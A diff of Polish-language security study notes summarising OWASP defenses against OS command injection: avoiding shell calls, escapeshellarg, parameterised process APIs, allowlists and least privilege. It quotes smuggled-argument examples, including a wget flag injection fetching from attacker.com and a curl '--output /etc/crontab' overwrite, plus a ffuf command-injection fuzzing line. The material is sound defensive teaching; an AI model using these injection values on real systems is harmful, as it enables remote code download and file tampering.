@@ -96,11 +96,50 @@ ffuf -u "https://TARGET/ping?host=FUZZ" -w Desktop/WSTG/fuzzdb-master/attack/os-
 
 > Źródło: OWASP CheatSheetSeries — OS_Command_Injection_Defense_Cheat_Sheet.md
 
-- UNIKAJ wywolan systemowych calkowicie — uzywaj natywnych API jezyka programowania
-- Jesli musisz: NIGDY nie konkatenuj user input do komend — uzywaj parameterized APIs
-- Allowlist validation: ogranicz dopuszczalne znaki (alfanumeryczne, bez ; | & ` $ > < itd.)
-- Uzywaj bibliotek/wrapperow ktore nie uruchamiaja shella (np. subprocess z list args w Python)
-- Uruchamiaj procesy z minimalnymi uprawnieniami (principle of least privilege)
+### Defense Option 1 — Unikaj wywolan OS calkowicie (PRIMARY)
+
+- NAJLEPSZA obrona: NIE wywoluj komend systemowych — uzywaj natywnych API/bibliotek jezyka
+- Przyklad: uzywaj `mkdir()` zamiast `system("mkdir /dir_name")`
+- Wbudowane funkcje biblioteczne NIE MOGA byc manipulowane do wykonywania innych zadan
+
+### Defense Option 2 — Escapowanie wartosci
+
+- PHP: uzywaj `escapeshellarg()` zamiast `escapeshellcmd()`
+  - `escapeshellarg()` — otacza input pojedynczymi cudzylowami, pozwala tylko JEDEN argument
+  - `escapeshellcmd()` — escapuje znaki specjalne, ale pozwala na argument injection (dodatkowe flagi)
+- Przyklad niebezpieczny z `escapeshellcmd()`:
+  - Input: `--directory-prefix=. http://attacker.com/malicious.php` — nadpisze flage wget
+- Przyklad bezpieczny z `escapeshellarg()`:
+  - Input zostaje otoczony cudzylowami — dodatkowa flaga staje sie czescia stringa
+
+### Defense Option 3 — Parameteryzacja + Input Validation
+
+- **Layer 1 — Parameteryzacja**: rozdziel komende od argumentow
+  - Java: `ProcessBuilder pb = new ProcessBuilder("TrustedCmd", "TrustedArg1", "TrustedArg2");`
+  - Java `Runtime.exec()` NIE uzywa shella — metaznaki sa traktowane jako argumenty (bezpieczniej niz C `system()`)
+  - Python: `subprocess.run(["cmd", "arg1", "arg2"])` z lista argumentow (NIE string)
+- **Layer 2 — Input validation**:
+  - Komendy: waliduj przeciw allowlist dozwolonych komend
+  - Argumenty: allowlist regex np. `^[a-z0-9]{3,10}$` — bez metaznakow
+  - Uzyj `--` jako delimiter konca opcji (POSIX Guideline 10): `curl -- $url`
+
+### Niebezpieczne znaki do filtrowania
+
+- Metaznaki komend: `& | ; $ > < \` \ ! ' " ( )`
+- Kazdy z tych znakow moze zmienic znaczenie komendy lub uruchomic dodatkowa komende
+- Whitespace takze moze byc problematyczny w niektorych kontekstach
+
+### Argument Injection — osobne zagrozenie
+
+- Nawet po escapowaniu znakow komend, atakujacy moze wstrzyknac dodatkowe ARGUMENTY
+- Przyklad: `curl $url` — atakujacy moze dodac `--help` lub `--output /etc/crontab`
+- Obrona: hardcoduj komende i flagi, waliduj input, uzyj `--` separatora
+
+### Dodatkowe srodki obrony
+
+- Uruchamiaj procesy z **minimalnymi uprawnieniami** (principle of least privilege)
+- Twórz izolowane konta z ograniczonymi uprawnieniami do pojedynczych zadan
+- Monitoruj i loguj wszystkie wywolania systemowe w aplikacji
 
 ## ROZSZERZENIA BURP SUITE
 
